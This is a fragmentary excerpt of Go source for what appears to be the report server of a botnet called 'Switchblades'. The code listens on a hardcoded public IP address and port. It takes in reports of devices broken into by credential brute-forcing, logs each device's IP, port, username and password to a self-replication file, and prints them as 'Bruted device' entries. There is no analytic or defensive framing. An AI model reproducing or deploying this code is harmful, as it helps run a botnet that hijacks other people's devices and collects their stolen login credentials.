...
func main() {
    l, err := net.Listen("tcp", "2.57.122.234:17244")
    if err != nil {
        fmt.Println(err)
        return
    }
...
func handleConnection(conn net.Conn) {
    ...
    if err != nil {
      ...
      file, err := os.OpenFile("SwitchbladesSelfrep.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
    if err != nil {
        log.Fatal("Cannot create file", err)
    }
    defer file.Close()
    fmt.Printf("\033[1;90m[\033[1;92mSwitchblades\033[1;90m]\033[1;92m Bruted device \033[1;90m[\033[1;92m%d\033[1;90m.\033[1;92m%d\033[1;90m.\033[1;92m%d\033[1;90m.\033[1;92m%d\033[1;90m:\033[1;92m%d\033[1;90m] [\033[1;92m%s\033[1;90m:\033[1;92m%s\033[1;90m]\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))
